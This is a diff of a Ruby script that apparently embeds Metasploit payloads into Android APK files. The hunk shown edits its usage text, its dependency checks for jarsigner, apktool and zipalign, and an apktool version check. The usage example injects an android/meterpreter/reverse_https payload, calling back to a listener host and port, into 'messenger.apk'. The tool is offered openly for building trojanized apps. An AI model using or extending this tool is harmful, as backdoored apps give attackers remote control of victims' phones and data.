@@ -144,34 +144,34 @@ end
 
 apkfile = ARGV[0]
 unless(apkfile && File.readable?(apkfile))
-  puts "[Usage]─➤ ruby EMBED.rb [target.apk] [msfvenom options]\n".cyan
-  puts "[ex]─➤ ruby EMBED.rb messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443".green
+  puts "[Usage]─➤ ruby embed.rb [target.apk] [msfvenom options]\n".cyan
+  puts "[ex]─➤ ruby embed.rb messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443".green
   exit(1)
 end
 
-jarsigner = `command -v jarsigner`
+jarsigner = `jarsigner`
 unless(jarsigner && jarsigner.length > 0)
   puts "[ERR-jarsigner]─➤ Going to https://t.me/Ivam3_Bot".red
 	exit(1)
 end
 
-apktool = `command -v apktool`
+apktool = `apktool`
 unless(apktool && apktool.length > 0)
   puts "[ERR-apktool]─➤ Going to https://t.me/Ivam3_Bot".red
 	exit(1)
 end
 
-zipalign = `command -v zipalign`
+zipalign = `ls ${PREFIX}/bin/zipalign`
 unless(zipalign && zipalign.length > 0)
   puts "[ERR-zipalign]─➤ Going to https://t.me/Ivam3_Bot".red
   exit(1)
 end
 
 apk_v=`apktool`
-#unless(apk_v.split()[1].include?("v2."))
-#	puts "[-] Apktool version #{apk_v} not supported, please download the latest 2. version from git.\n"
-#	exit(1)
-#end
+unless(apk_v.split()[1].include?("v2."))
+  puts "[ERR-wpktool]─➤ version #{apk_v} not supported, please download the latest 2. version from git.\n".red
+	exit(1)
+end
 
 begin
 	msfvenom_opts = ARGV[1,ARGV.length]
